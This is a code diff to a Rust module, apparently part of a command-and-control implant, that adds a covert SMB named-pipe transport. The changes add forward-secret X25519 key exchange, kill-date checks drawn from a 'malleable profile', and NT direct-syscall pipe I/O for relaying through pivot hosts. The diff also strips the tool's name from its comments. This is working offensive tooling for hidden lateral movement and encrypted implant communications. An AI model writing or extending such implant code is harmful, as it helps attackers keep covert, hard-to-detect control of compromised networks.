@@ -1,4 +1,4 @@
-//! SMB / TCP named-pipe covert transport for the Orchestra agent.
+//! SMB / TCP named-pipe covert transport.
 //!
 //! # Status: EXPERIMENTAL — not recommended for production use.
 //! Enabled only when built with `--features smb-pipe-transport`.
@@ -280,6 +280,27 @@ mod nt_pipe {
         }
     }
 
+    impl std::io::Read for NtPipeHandle {
+        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
+            let handle = *self.handle.lock().unwrap();
+            unsafe { read_file(handle, buf) }
+                .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
+        }
+    }
+
+    impl std::io::Write for NtPipeHandle {
+        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
+            let handle = *self.handle.lock().unwrap();
+            unsafe { write_file(handle, buf) }
+                .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
+        }
+
+        fn flush(&mut self) -> std::io::Result<()> {
+            // Named pipes are not buffered; flush is a no-op.
+            Ok(())
+        }
+    }
+
     impl Drop for NtPipeHandle {
         fn drop(&mut self) {
             let handle = *self.handle.lock().unwrap();
@@ -302,7 +323,7 @@ mod nt_pipe {
 ///   standard `tokio::net::TcpStream`.  A relay on the pivot host bridges
 ///   to the named pipe.
 ///
-/// Both modes use the standard Orchestra framing: 4-byte LE length prefix
+/// Both modes use the standard framing: 4-byte LE length prefix
 /// followed by AES-256-GCM-encrypted message bytes.
 pub enum SmbPipeTransport {
     /// Direct SMB named-pipe connection using NT syscalls (Windows only).
@@ -310,11 +331,17 @@ pub enum SmbPipeTransport {
     Pipe {
         pipe: std::sync::Arc<nt_pipe::NtPipeHandle>,
         session: CryptoSession,
+        /// Kill date from the malleable profile (YYYY-MM-DD). Checked on
+        /// every send/recv cycle so the agent terminates gracefully.
+        kill_date: String,
     },
     /// TCP relay to a local named-pipe forwarder.
     Relay {
         stream: TcpStream,
         session: CryptoSession,
+        /// Kill date from the malleable profile (YYYY-MM-DD). Checked on
+        /// every send/recv cycle so the agent terminates gracefully.
+        kill_date: String,
     },
 }
 
@@ -326,9 +353,14 @@ impl SmbPipeTransport {
     /// - `smb_pipe_name` — pipe name (defaults to the compile-time randomised constant)
     /// - `smb_pipe_mode` — "smb" or "tcp_relay" (defaults to "smb")
     /// - `smb_tcp_relay_port` — TCP relay port (defaults to 4455)
+    ///
+    /// After the connection is established, an X25519 ECDH key exchange is
+    /// performed to derive a forward-secret session key.  The PSK is used
+    /// for authentication during the exchange but is never used directly as
+    /// the session key.
     pub async fn new(
         profile: &MalleableProfile,
-        session: CryptoSession,
+        psk: &[u8],
     ) -> Result<Self> {
         let host = profile
             .smb_pipe_host
@@ -348,26 +380,38 @@ impl SmbPipeTransport {
         let tcp_relay_port = profile
             .smb_tcp_relay_port
             .unwrap_or(4455);
+        let kill_date = profile.kill_date.clone();
 
         match mode {
             "tcp_relay" => {
                 info!("smb-pipe: using tcp_relay mode, connecting to localhost:{tcp_relay_port}");
-                let stream = TcpStream::connect(format!("127.0.0.1:{tcp_relay_port}")).await?;
+                let mut stream = TcpStream::connect(format!("127.0.0.1:{tcp_relay_port}")).await?;
                 stream.set_nodelay(true)?;
-                Ok(Self::Relay { stream, session })
+
+                info!("smb-pipe: TCP relay connected, performing X25519 ECDH key exchange");
+                let session = common::forward_secrecy::negotiate_session_key(
+                    &mut stream,
+                    psk,
+                    true, // client sends first
+                ).await.map_err(|e| anyhow!("smb-pipe: ECDH key exchange failed: {e}"))?;
+                info!("smb-pipe: forward-secret session established");
+
+                Ok(Self::Relay { stream, session, kill_date })
             }
             _ => {
-                Self::connect_smb_pipe(host, pipe_name, session).await
+                Self::connect_smb_pipe(host, pipe_name, psk, kill_date).await
             }
         }
     }
 
-    /// Connect to a named pipe via SMB using NT direct syscalls with retry.
+    /// Connect to a named pipe via SMB using NT direct syscalls with retry,
+    /// then perform X25519 ECDH key exchange for forward secrecy.
     #[cfg(windows)]
     async fn connect_smb_pipe(
         host: &str,
         pipe_name: &str,
-        session: CryptoSession,
+        psk: &[u8],
+        kill_date: String,
     ) -> Result<Self> {
         let pipe_path = format!(r"\\{host}\pipe\{pipe_name}");
         info!("smb-pipe: connecting to {pipe_path}");
@@ -381,8 +425,26 @@ impl SmbPipeTransport {
             match unsafe { nt_pipe::open_pipe(&pipe_path) } {
                 Ok(handle) => {
                     info!("smb-pipe: pipe opened successfully on attempt {attempt}");
-                    let pipe = std::sync::Arc::new(nt_pipe::NtPipeHandle::new(handle));
-                    return Ok(Self::Pipe { pipe, session });
+                    let mut pipe_handle = nt_pipe::NtPipeHandle::new(handle);
+
+                    // Perform the ECDH exchange in a blocking thread
+                    // because NtPipeHandle uses synchronous NT syscalls.
+                    info!("smb-pipe: performing X25519 ECDH key exchange");
+                    let psk_owned = psk.to_vec();
+                    let session = tokio::task::spawn_blocking(move || {
+                        common::forward_secrecy::negotiate_session_key_blocking(
+                            &mut pipe_handle,
+                            &psk_owned,
+                            true, // client sends first
+                        )
+                    })
+                    .await
+                    .map_err(|e| anyhow!("smb-pipe: ECDH task panicked: {e}"))?
+                    .map_err(|e| anyhow!("smb-pipe: ECDH key exchange failed: {e}"))?;
+
+                    info!("smb-pipe: forward-secret session established");
+                    let pipe = std::sync::Arc::new(pipe_handle);
+                    return Ok(Self::Pipe { pipe, session, kill_date });
                 }
                 Err(e) => {
                     let win_err = nt_pipe::last_win32_error();
@@ -422,7 +484,7 @@ impl SmbPipeTransport {
     async fn connect_smb_pipe(
         _host: &str,
         _pipe_name: &str,
-        _session: CryptoSession,
+        _psk: &[u8],
     ) -> Result<Self> {
         Err(anyhow!(
             "smb-pipe: SMB direct mode is only supported on Windows; \
@@ -434,8 +496,18 @@ impl SmbPipeTransport {
 #[async_trait]
 impl Transport for SmbPipeTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
+        // Enforce kill date on every send cycle.
+        let kill_date = match self {
+            Self::Relay { kill_date, .. } => kill_date,
+            #[cfg(windows)]
+            Self::Pipe { kill_date, .. } => kill_date,
+        };
+        if !kill_date.is_empty() {
+            crate::config::check_kill_date(kill_date)?;
+        }
+
         match self {
-            Self::Relay { stream, session } => {
+            Self::Relay { stream, session, .. } => {
                 let plain = bincode::serialize(&msg)?;
                 let enc = session.encrypt(&plain);
                 stream.write_u32_le(enc.len() as u32).await?;
@@ -443,7 +515,7 @@ impl Transport for SmbPipeTransport {
                 Ok(())
             }
             #[cfg(windows)]
-            Self::Pipe { pipe, session } => {
+            Self::Pipe { pipe, session, .. } => {
                 let plain = bincode::serialize(&msg)?;
                 let enc = session.encrypt(&plain);
                 let len_bytes = (enc.len() as u32).to_le_bytes();
@@ -462,8 +534,18 @@ impl Transport for SmbPipeTransport {
     }
 
     async fn recv(&mut self) -> Result<Message> {
+        // Enforce kill date on every recv cycle.
+        let kill_date = match self {
+            Self::Relay { kill_date, .. } => kill_date,
+            #[cfg(windows)]
+            Self::Pipe { kill_date, .. } => kill_date,
+        };
+        if !kill_date.is_empty() {
+            crate::config::check_kill_date(kill_date)?;
+        }
+
         match self {
-            Self::Relay { stream, session } => {
+            Self::Relay { stream, session, .. } => {
                 let len = stream.read_u32_le().await?;
                 if len > MAX_FRAME_BYTES {
                     anyhow::bail!("smb-pipe: frame too large: {len} bytes");
@@ -476,7 +558,7 @@ impl Transport for SmbPipeTransport {
                 Ok(bincode::deserialize(&plain)?)
             }
             #[cfg(windows)]
-            Self::Pipe { pipe, session } => {
+            Self::Pipe { pipe, session, .. } => {
                 let len = {
                     let pipe_c = pipe.clone();
                     tokio::task::spawn_blocking(move || {
